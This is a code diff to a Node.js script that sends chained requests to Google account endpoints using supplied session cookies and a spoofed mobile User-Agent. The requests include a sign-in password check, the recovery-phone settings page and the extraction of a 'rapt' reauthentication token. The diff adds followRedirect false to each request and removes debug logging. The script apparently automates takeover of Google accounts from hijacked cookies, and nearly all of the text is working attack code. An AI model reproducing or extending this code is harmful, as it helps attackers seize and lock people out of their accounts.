@@ -67,7 +67,8 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps, pass
             'Cookie': again == 1 ? '__Host-GAPS='+gps+'; '+sendCookies : '__Host-GAPS='+gps,
             'content-type' : 'application/x-www-form-urlencoded;charset=UTF-8',
             'google-accounts-xsrf' : 1
-        }
+        },
+        followRedirect: (resp) => { return false }
     }, function(error, responce, body) {
 
         let output = 0
@@ -93,7 +94,8 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps, pass
                         headers: {
                             'Cookie': sendCookies,
                             'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-                        }
+                        },
+                        followRedirect: (resp) => { return false }
                     }, function(error, responce, body) {
                         let wrong = true
                         try {
@@ -109,7 +111,8 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps, pass
                                     method: 'GET',
                                     headers: {
                                         'Cookie': tempCookes
-                                    }
+                                    },
+                                    followRedirect: (resp) => { return false }
                                 }, function(error, responce, body) {
                                     let wrong = true
                                     try {
@@ -190,21 +193,19 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps, pass
 function getRaptToken(connection, password, mData) {
     let sendCookies = mData[7]
 
-    console.log(sendCookies)
-
     request({
         url: 'https://myaccount.google.com/signinoptions/rescuephone',
         method: 'GET',
         headers: {
             'Cookie': sendCookies,
             'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-        }
+        },
+        followRedirect: (resp) => { return false }
     }, function(error, response, body) {
         let wrong = true
         try {
             if (!error) {
                 let headers = response.headers
-                console.log(headers['location'])
                 if(headers && headers['location']) {
                     let index = headers['location'].indexOf('rart=')
                     let split = headers['location'].substring(index, headers['location'].length).split('&')
@@ -215,7 +216,8 @@ function getRaptToken(connection, password, mData) {
                         headers: {
                             'Cookie': sendCookies,
                             'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-                        }
+                        },
+                        followRedirect: (resp) => { return false }
                     }, function(error, response, body) {
                         let wrong = true
                         try {
@@ -290,7 +292,8 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
         headers: {
             'Cookie': sendCookies,
             'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-        }
+        },
+        followRedirect: (resp) => { return false }
     }, function(error, response, body) {
         let wrong = true
         try {
@@ -363,7 +366,8 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                         headers: {
                             'Cookie': sendCookies,
                             'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
-                        } 
+                        },
+                        followRedirect: (resp) => { return false }
                     }, function(error, response, body) {
                         let wrong = true
                         try {
@@ -377,7 +381,8 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                     headers: {
                                         'Cookie': sendCookies,
                                         'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
-                                    }
+                                    },
+                                    followRedirect: (resp) => { return false }
                                 }, function(error, response, body) {
                                     let wrong = true
                                     try {
@@ -401,7 +406,8 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                                             headers: {
                                                                 'Cookie': sendCookies,
                                                                 'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-                                                            }
+                                                            },
+                                                            followRedirect: (resp) => { return false }
                                                         }, function(error, response, body) {
                                                             let wrong = true
                                                             try {
@@ -451,7 +457,8 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                                                                         'Cookie': sendCookies,
                                                                                         'Content-Type' :'application/x-www-form-urlencoded;charset=UTF-8',
                                                                                         'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-                                                                                    }
+                                                                                    },
+                                                                                    followRedirect: (resp) => { return false }
                                                                                 }, function(error, response, body) {
                                                                                     output++
                                                                                     if(output == size) {
@@ -464,7 +471,8 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                                                                             headers: {
                                                                                                 'Cookie': sendCookies,
                                                                                                 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
-                                                                                            }
+                                                                                            },
+                                                                                            followRedirect: (resp) => { return false }
                                                                                         }, function(error, response, body) {
                                                                                             let wrong = true
                                                                                             try {
@@ -510,7 +518,8 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                                                         headers: {
                                                                             'Cookie': sendCookies,
                                                                             'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
-                                                                        }
+                                                                        },
+                                                                        followRedirect: (resp) => { return false }
                                                                     }, function(error, response, body) {
                                                                         let wrong = true
                                                                         try {
